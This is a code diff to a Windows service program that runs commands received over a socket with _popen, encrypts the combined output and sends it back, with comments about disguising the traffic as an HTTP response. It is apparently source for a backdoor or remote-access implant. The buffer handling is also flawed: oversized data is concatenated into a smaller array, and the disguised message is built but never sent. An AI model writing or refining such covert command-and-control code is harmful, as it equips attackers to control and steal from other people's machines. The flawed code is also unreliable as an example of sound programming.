@@ -195,8 +195,9 @@ void ServiceMain(DWORD argc, LPTSTR* argv) {
             strcat_s(command, rsize_t(1100), "\"");
 
             // Create variables to run and store command output
-            char commandOutput[8192];
+            char* commandOutput = (char*)calloc(8192, sizeof(char));
             FILE* pipe;
+            char* messageToSendBack = (char*)calloc(16384, sizeof(char));
 
             // Open the command for reading
             pipe = _popen(command, "r");
@@ -204,26 +205,29 @@ void ServiceMain(DWORD argc, LPTSTR* argv) {
                 printf("Error opening pipe.\n");
             }
 
-            // Read the output a line and send it back to the Server
-            while (fgets(commandOutput, 8190, pipe) != NULL) {
-                // fgets appends \0 to the end, but not \n. The next 3 lines overwrite the \0 with \n, and then append \0 after
-                encrypt(commandOutput);
-                int len = strnlen(commandOutput, 8190);
-                commandOutput[len] = '\n';
-                commandOutput[len + 1] = '\0';
-
-                // Disguise the command output in an HTTP Header
-                char message[8292] = "HTTP/1.1 200 OK\r\nContent-Length: ";
-                char messageSize[6];
-                sprintf_s(messageSize, "%d", (int)strnlen(commandOutput, 8190));
-                strncat_s(message, messageSize, 6);
-                char endMessage[46] = "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
-                strncat_s(message, endMessage, 46);
-                strncat_s(message, commandOutput, 8192);
-
-
-                send(clientSocket, commandOutput, strnlen(commandOutput, 8192), 0);
+            // Get all of the output from the command, and put it all into one string
+            while (fgets(commandOutput, 8100, pipe) != NULL) {
+                strncat_s(messageToSendBack, rsize_t(16384), commandOutput, rsize_t(8190));
             }
+            strncat_s(messageToSendBack, rsize_t(16384), "END_OF_OUTPUT", 16);
+
+            // strncat_s appends \0 to the end, but not \n. The next 3 lines overwrite the \0 with \n, and then append \0 after
+            encrypt(messageToSendBack);
+            int len = strnlen(messageToSendBack, 16384);
+            messageToSendBack[len] = '\n';
+            messageToSendBack[len + 1] = '\0';
+
+            // Disguise the command output in an HTTP Header
+            char message[8292] = "HTTP/1.1 200 OK\r\nContent-Length: ";
+            char messageSize[6];
+            sprintf_s(messageSize, "%d", (int)strnlen(messageToSendBack, 16384));
+            strncat_s(message, messageSize, 6);
+            char endMessage[46] = "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
+            strncat_s(message, endMessage, 46);
+            strncat_s(message, messageToSendBack, 16384);
+
+
+            send(clientSocket, messageToSendBack, strnlen(messageToSendBack, 16384), 0);
 
             // Close the pipe
             _pclose(pipe);
